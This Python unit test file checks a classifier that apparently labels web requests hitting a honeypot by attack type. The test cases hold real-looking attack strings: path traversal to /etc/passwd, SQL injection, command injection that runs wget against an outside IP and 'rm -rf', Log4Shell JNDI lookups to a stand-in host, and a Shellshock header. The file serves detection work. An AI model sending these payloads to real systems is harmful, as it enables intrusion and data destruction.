"""Unit tests for the category rules."""

from __future__ import annotations

import unittest

from trap import classify

CASES = [
    # (path, query, body, headers, expected category)
    ("/.env", "", "", [], "sensitive-file-probe"),
    ("/.git/config", "", "", [], "sensitive-file-probe"),
    ("/app/config.json", "", "", [], "sensitive-file-probe"),
    ("/backup.sql", "", "", [], "sensitive-file-probe"),
    ("/wp-login.php", "", "", [], "wordpress-probe"),
    ("/xmlrpc.php", "", "", [], "wordpress-probe"),
    ("/wp-content/plugins/x/readme.txt", "", "", [], "wordpress-probe"),
    ("/phpmyadmin/index.php", "", "", [], "phpmyadmin-probe"),
    ("/pma/", "", "", [], "phpmyadmin-probe"),
    ("/admin", "", "", [], "admin-discovery"),
    ("/administrator/index.php", "", "", [], "admin-discovery"),
    ("/server-status", "", "", [], "admin-discovery"),
    ("/../../etc/passwd", "", "", [], "path-traversal"),
    ("/%2e%2e/%2e%2e/etc/passwd", "", "", [], "path-traversal"),
    ("/x", "file=..%2f..%2fwin.ini", "", [], "path-traversal"),
    ("/item", "id=1'+UNION+SELECT+username,password+FROM+users--", "", [], "sqli-attempt"),
    ("/login", "", "user=admin' OR '1'='1", [], "sqli-attempt"),
    ("/x", "id=1 AND SLEEP(5)", "", [], "sqli-attempt"),
    ("/x", "cmd=;wget http://198.51.100.7/a.sh", "", [], "command-injection"),
    ("/x", "", "host=127.0.0.1|cat /etc/passwd", [], "command-injection"),
    ("/x", "q=$(id)", "", [], "command-injection"),
    ("/shell", "cd+/tmp;rm+-rf+*;wget+http://198.51.100.7/m;chmod+777+m", "", [], "command-injection"),
    ("/", "", "", [("User-Agent", "${jndi:ldap://evil.invalid/a}")], "log4shell"),
    ("/", "x=${${lower:j}ndi:ldap://e.invalid/}", "", [], "log4shell"),
    ("/cgi-bin/status", "", "", [("User-Agent", "() { :; }; /bin/bash -c 'id'")], "shellshock"),
    ("/boaform/admin/formLogin", "", "", [], "router-iot-exploit"),
    ("/GponForm/diag_Form", "images/", "", [], "router-iot-exploit"),
    ("/HNAP1/", "", "", [], "router-iot-exploit"),
    ("/cgi-bin/luci/;stok=/locale", "", "", [], "router-iot-exploit"),
]

BENIGN = [
    ("/", "", "", [("User-Agent", "Mozilla/5.0")]),
    ("/favicon.ico", "", "", []),
    ("/index.html", "lang=en", "", []),
    ("/robots.txt", "", "", []),
    ("/blog/administration-tips", "", "", []),
]


class ClassifyTests(unittest.TestCase):
    def test_each_category(self) -> None:
        for path, query, body, headers, expected in CASES:
            with self.subTest(path=path, query=query, body=body):
                self.assertIn(expected, classify(path, query, body, headers))

    def test_benign_is_unknown(self) -> None:
        for path, query, body, headers in BENIGN:
            with self.subTest(path=path):
                self.assertEqual(classify(path, query, body, headers), ["unknown"])

    def test_multiple_categories(self) -> None:
        cats = classify(
            "/cgi-bin/x", "a=;wget http://198.51.100.7/x", "", [("User-Agent", "() { :; };")]
        )
        self.assertTrue({"router-iot-exploit", "command-injection", "shellshock"} <= set(cats))


if __name__ == "__main__":
    unittest.main()
